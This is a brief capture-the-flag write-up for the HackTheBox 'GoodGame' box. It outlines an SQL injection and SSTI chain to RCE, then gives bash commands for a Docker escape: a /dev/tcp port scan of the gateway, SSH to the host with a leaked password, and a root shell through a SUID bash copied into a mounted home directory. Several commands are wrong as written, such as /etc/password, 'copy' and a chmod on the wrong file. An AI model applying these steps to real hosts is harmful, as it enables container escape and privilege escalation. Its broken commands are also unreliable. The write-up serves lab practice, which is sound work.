# Docker Escapes and Priviledge Escalation - HackTheBox University CTF "GoodGame"

**Description**: Docker escapes via *ssh*, priv escala with *mounted directory*

**RCE**: vulnerable to sql injection -> using sqlmap--> logged in as admin --> vulnerable SSTI -> using subprocess --> *RCE*

## Docker Escapes
```bash
ip a s
#  eth0: 172.19.0.2/16

for PORT in {1..1000}; do timeout 1s bash -c "/dev/tcp/172.19.0.1/$PORT" > /dev/null; done # 172.19.0.1: docker gateway
# Port 22 SSH(come through, not connection refuse)

# SSH require interactive shell --> stabelize it
# with the password we got before, ssh to host docker machine.
ssh augustus@172.19.0.1
# Password: supperadministratorpassword

# We're now free from container
```
## Priviledge Escalation
**Still in the docker container**:
```bash
cat /etc/password
# Don't see augustus user
# => Still have augustus home directory => This home directory is being mounted into this docker container

# Step to priv escala
# Step 1: Back to host docker machine
ssh augustus@172.19.0.1
# Password: supperadministratorpassword

# Step 2: Copy /bin/bash to augustus home directory(mounted to docker container)
copy /bin/bash /home/augustus

# Step 3: Back to docker container
exit

# Step 4: Because user in the container is root, SUID for /bin/bash
chmod +s /bin/bash

# Step 5: Back to host machine and run it
ssh augustus@172.19.0.1 # ....
/bin/bash
whoami # root
```
